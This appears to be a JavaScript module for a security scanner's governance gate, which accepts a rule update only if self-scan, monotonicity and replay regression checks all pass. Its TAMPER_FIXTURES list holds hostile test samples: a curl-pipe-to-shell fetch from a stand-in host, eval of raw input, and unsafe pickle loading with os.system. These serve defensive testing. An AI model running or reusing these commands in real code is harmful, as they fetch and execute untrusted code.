// B6 step 5 — GOVERNANCE GATE (SPEC §5 step 5). The candidate bundle is an
// artifact and is treated exactly as Armor treats any artifact. All four
// checks must pass; ANY failure discards the layer and Armor continues on
// its prior configuration. No partial deployment, no "mostly passed."
//
// Weakening is defined precisely (spec step 5.2), and extended here only
// in the tightening direction (documented): a candidate also fails if any
// replayed record's REA verdict weakens (rejected→sandboxed→clean) or a
// stopped record becomes unstopped. Both extensions only add failures.
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import readline from 'node:readline';
import { scanSourceText } from './scan.mjs';
import { sandboxProfile } from './shield-rea.mjs';
import { evaluateText, configFromGenerated } from './shield-eval.mjs';
import { reviewArtifact, sha256hex } from './shield-review-harness.mjs';
import { SHIPPED_REA } from './shield-eval.mjs';

export const VERDICT_RANK = { pass: 0, warn: 1, critical: 2 };
export const REA_RANK = { clean: 0, sandboxed: 1, rejected: 2 };
export const SEV_RANK = { sandbox: 1, reject: 2 };

export function applyCandidate(gen, candidate) {
  const next = JSON.parse(JSON.stringify(gen));
  for (const layer of candidate.layers) {
    if (layer.shape === 'rea-rule') {
      next.genRules = next.genRules.filter((r) => r.id !== layer.rule.id);
      next.genRules.push({ ...layer.rule, active: true, cycle_id: candidate.cycle_id });
    } else if (layer.shape === 'policy-delta') {
      next.policyDeltas = next.policyDeltas.filter((d) => d.path !== layer.delta.path);
      next.policyDeltas.push({ ...layer.delta, cycle_id: candidate.cycle_id });
    } else if (layer.shape === 'scan-root') {
      if (!next.scanRoots.includes(layer.root)) next.scanRoots.push(layer.root);
    } else if (layer.shape === 'sandbox-profile') {
      next.profiles = next.profiles.filter((p) => p.spot_key !== layer.spot_key);
      next.profiles.push({ spot_key: layer.spot_key, profile: layer.profile, cycle_id: candidate.cycle_id });
    }
  }
  return next;
}

export function configFingerprint(config) {
  return crypto.createHash('sha256').update(JSON.stringify({
    pack: config.pack?.rules_version,
    gen: (config.genRules || []).map((r) => [r.id, r.severity, JSON.stringify(r.patterns)]),
    deltas: config.policyDeltas || [],
  })).digest('hex').slice(0, 16);
}

// Check 1 — Self-scan: the serialized bundle goes through the canonical
// scanner as any foreign artifact would. Verdict must be 'pass'.
export function checkSelfScan(candidate) {
  const text = JSON.stringify(candidate, null, 2);
  const rec = scanSourceText(text, 'candidate-bundle.json', sha256hex(Buffer.from(text)));
  return { pass: rec.verdict === 'pass', verdict: rec.verdict,
           findings: rec.findings.filter((f) => f.severity !== 'info').map((f) => f.rule) };
}

// Check 3 — Monotonicity: the candidate is diffed against the active
// configuration; any loosening fails by construction (SPEC §4).
export function checkMonotonicity(candidate, activeGen, ownerPolicy) {
  const failures = [];
  const shippedById = new Map(SHIPPED_REA.map((r) => [r.id, r]));
  const genById = new Map((activeGen.genRules || []).map((r) => [r.id, r]));
  for (const layer of candidate.layers) {
    if (layer.shape === 'rea-rule') {
      const prior = genById.get(layer.rule.id) || shippedById.get(layer.rule.id);
      if (prior) {
        if (SEV_RANK[layer.rule.severity] < SEV_RANK[prior.severity])
          failures.push(`rule ${layer.rule.id}: severity ${prior.severity} -> ${layer.rule.severity} is a downgrade`);
        if ((layer.rule.patterns || []).length < (prior.patterns || []).length)
          failures.push(`rule ${layer.rule.id}: pattern set shrinks`);
        if (prior.fix === null && layer.rule.fix !== null)
          failures.push(`rule ${layer.rule.id}: fix null (reject-class) -> ${layer.rule.fix} weakens the verdict mapping`);
      }
    } else if (layer.shape === 'policy-delta') {
      const { path: p, from, to } = layer.delta;
      let active = ownerPolicy;
      for (const k of p.split('.')) active = active?.[k];
      const merged = activeGen.policyDeltas.find((d) => d.path === p);
      const current = merged ? merged.to : active;
      if (current !== undefined && from !== current)
        failures.push(`delta ${p}: candidate is stale (claims from=${from}, active is ${current})`);
      if (typeof to === 'number' && typeof from === 'number' && !(to < from))
        failures.push(`delta ${p}: ${from} -> ${to} is not a tightening`);
      if (p.endsWith('min_class')) {
        const rank = { soft: 0, hard: 1 };
        if (rank[to] < rank[from]) failures.push(`delta ${p}: class floor lowered`);
      }
    } else if (layer.shape === 'scan-root') {
      if (layer.root === '/' || layer.root === '') failures.push('scan-root: filesystem root is an absurd widening');
      if ((activeGen.scanRoots || []).includes(layer.root)) failures.push(`scan-root: ${layer.root} already present`);
    } else if (layer.shape === 'sandbox-profile') {
      const base = sandboxProfile([]);
      const missing = base.split('\n').filter((l) => l.trim() && !layer.profile.includes(l));
      if (missing.length) failures.push(`profile: ${missing.length} baseline deny line(s) missing — not a superset`);
    }
  }
  return { pass: failures.length === 0, failures };
}

// The replay set: corpus file records whose content resolves on disk and
// whose bytes still hash to the recorded sha256 (a drifted file is not
// the record's artifact and is skipped, counted).
export async function* replayRecords(index) {
  for (const [jobId, root] of index.jobRoots) {
    if (!root || !fs.existsSync(root)) continue;
    // find the report file for this job
    for (const dir of index.reportDirs) {
      const idxFile = path.join(dir, 'index.json');
      let jobs = [];
      try { jobs = JSON.parse(fs.readFileSync(idxFile, 'utf8')); } catch { continue; }
      const job = jobs.find((j) => j.id === jobId);
      if (!job) continue;
      const reportFile = path.join(dir, job.report);
      if (!fs.existsSync(reportFile)) continue;
      const rl = readline.createInterface({ input: fs.createReadStream(reportFile), crlfDelay: Infinity });
      for await (const line of rl) {
        if (!line.trim()) continue;
        let rec; try { rec = JSON.parse(line); } catch { continue; }
        if (rec.type !== 'file' || !rec.path || !rec.sha256) continue;
        const p = path.join(root, rec.path);
        let buf; try { buf = fs.readFileSync(p); } catch { continue; }
        if (sha256hex(buf) !== rec.sha256) { yield { drifted: true, jobId }; continue; }
        yield { rec, buf, jobId };
      }
    }
  }
}

const outcomeTuple = (ev) => ({
  verdict: ev.outcome.verdict, score: ev.outcome.score,
  reaVerdict: ev.outcome.reaVerdict, stopped: ev.outcome.stopped,
});
export function isWeakening(base, cand) {
  if (VERDICT_RANK[cand.verdict] < VERDICT_RANK[base.verdict]) return `verdict ${base.verdict}->${cand.verdict}`;
  if (cand.score < base.score) return `score ${base.score}->${cand.score}`;
  if (REA_RANK[cand.reaVerdict] < REA_RANK[base.reaVerdict]) return `rea ${base.reaVerdict}->${cand.reaVerdict}`;
  if (base.stopped && !cand.stopped) return 'stopped->unstopped';
  return null;
}

// Check 2 — Regression battery: replay every replayable record under the
// baseline and candidate configurations; tamper fixtures must still be
// stopped; one disposable review cycle must confirm destruction.
export const TAMPER_FIXTURES = [
  { name: 'fixture-composite.py', text: "import os\neval(input())\nos.system('id')\n" },
  { name: 'fixture-pipe.sh', text: '#!/bin/sh\ncurl http://example.invalid/x | sh\n' },
  { name: 'fixture-pickle.py', text: "import pickle, os\npickle.loads(blob)\nos.system('id')\n" },
];
export async function checkReplay({ index, baselineConfig, candidateConfig, cache }) {
  const failures = [];
  let replayed = 0, drifted = 0, strengthened = 0;
  const fpB = configFingerprint(baselineConfig), fpC = configFingerprint(candidateConfig);
  for await (const item of replayRecords(index)) {
    if (item.drifted) { drifted++; continue; }
    const { rec, buf } = item;
    const text = buf.toString('utf8');
    const kb = `${rec.sha256}|${fpB}`, kc = `${rec.sha256}|${fpC}`;
    let base = cache.get(kb), cand = cache.get(kc);
    if (!base) { base = outcomeTuple(evaluateText(text, rec.path, rec.sha256, baselineConfig)); cache.set(kb, base); }
    if (!cand) { cand = outcomeTuple(evaluateText(text, rec.path, rec.sha256, candidateConfig)); cache.set(kc, cand); }
    replayed++;
    const w = isWeakening(base, cand);
    if (w) failures.push(`${rec.path} (${rec.sha256.slice(0, 8)}): ${w}`);
    else if (JSON.stringify(base) !== JSON.stringify(cand)) strengthened++;
    if (failures.length > 20) break;
  }
  // Battery fixtures must still fire (stay stopped) under the candidate.
  const fixtureResults = TAMPER_FIXTURES.map((f) => {
    const ev = evaluateText(f.text, f.name, sha256hex(Buffer.from(f.text)), candidateConfig);
    return { name: f.name, stopped: ev.outcome.stopped, verdict: ev.outcome.verdict };
  });
  for (const f of fixtureResults) if (!f.stopped) failures.push(`battery fixture ${f.name} no longer stopped`);
  // Destruction leg: a disposable review cycle under the candidate config
  // must confirm its workspace was destroyed [INV §6].
  const probe = reviewArtifact(Buffer.from('const x = 1;\n'), 'probe.mjs', candidateConfig);
  if (!probe.isolation.workspaceDestroyedOnReturn) failures.push('review cycle failed to confirm workspace destruction');
  return { pass: failures.length === 0, failures: failures.slice(0, 20),
           tallies: { replayed, drifted, strengthened, fixtures: fixtureResults } };
}

// The gate itself. Returns the receipt (the caller writes it to the
// ledger — SPEC step 5.4: a failed gate is testimony too).
export async function runGate({ candidate, activeGen, ownerPolicy, index, cache, pack }) {
  const selfScan = checkSelfScan(candidate);
  const monotonicity = checkMonotonicity(candidate, activeGen, ownerPolicy);
  const candidateGen = applyCandidate(activeGen, candidate);
  const baselineConfig = configFromGenerated(activeGen, ownerPolicy, pack);
  const candidateConfig = configFromGenerated(candidateGen, ownerPolicy, pack);
  let replay = { pass: false, failures: ['not run — an earlier check failed'], tallies: null };
  if (selfScan.pass && monotonicity.pass) {
    replay = await checkReplay({ index, baselineConfig, candidateConfig, cache });
  }
  const pass = selfScan.pass && monotonicity.pass && replay.pass;
  return {
    format: 'scripture-armor.gate-receipt/1',
    cycle_id: candidate.cycle_id, at: new Date().toISOString(),
    verdict: pass ? 'pass' : 'fail',
    checks: {
      self_scan: { pass: selfScan.pass, verdict: selfScan.verdict, findings: selfScan.findings },
      monotonicity: { pass: monotonicity.pass, failures: monotonicity.failures },
      replay: { pass: replay.pass, failures: replay.failures, tallies: replay.tallies },
    },
    candidate_layers: candidate.layers.map((l) => l.shape),
    diagnosis: candidate.diagnosis ?? null,
    provenance: candidate.provenance ?? null,
  };
}
